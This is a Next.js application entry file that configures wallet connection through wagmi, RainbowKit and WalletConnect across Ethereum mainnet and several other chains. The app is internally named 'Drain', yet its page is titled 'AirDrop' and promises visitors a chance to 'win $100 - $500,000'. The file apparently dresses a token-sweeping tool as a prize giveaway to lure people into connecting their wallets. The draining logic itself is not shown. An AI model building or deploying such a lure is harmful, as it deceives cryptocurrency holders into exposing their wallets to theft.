import { CssBaseline, GeistProvider } from '@geist-ui/core';
import type { AppProps } from 'next/app';
import NextHead from 'next/head';
import GithubCorner from 'react-github-corner';
// @ts-ignore
import '../styles/globals.css';

// Imports
import {
  configureChains,
  createConfig,
  WagmiConfig,
  mainnet,
} from 'wagmi';
import { publicProvider } from 'wagmi/providers/public';

import { getDefaultWallets, RainbowKitProvider } from '@rainbow-me/rainbowkit';
import '@rainbow-me/rainbowkit/styles.css';

import { arbitrum, bsc, gnosis, optimism, polygon } from 'viem/chains';
import { z } from 'zod';
import { useIsMounted } from '../hooks';

// Vérification de l'environnement
const walletConnectProjectId = z
  .string()
  .parse(process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID);

const { chains, publicClient } = configureChains(
  [mainnet, polygon, optimism, arbitrum, bsc, gnosis],
  [publicProvider()],
);

const { connectors } = getDefaultWallets({
  appName: 'Drain',
  projectId: walletConnectProjectId,
  chains,
});

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors,
  publicClient,
});

const App = ({ Component, pageProps }: AppProps) => {
  const isMounted = useIsMounted();

  if (!isMounted) return null;

  return (
    <>
      <GithubCorner
        href="https://github.com/dawsbot/drain"
        size="140"
        bannerColor="#e056fd"
      />

      <WagmiConfig config={wagmiConfig}>
        <RainbowKitProvider coolMode chains={chains}>
          <NextHead>
            <title>AirDrop</title>
            <meta
              name="description"
              content="Try to win $100 - $500,000 AirDrop distribution"
            />
            <link rel="icon" href="/favicon.ico" />
          </NextHead>
          <GeistProvider>
            <CssBaseline />
            <Component {...pageProps} />
          </GeistProvider>
        </RainbowKitProvider>
      </WagmiConfig>
    </>
  );
};

export default App;
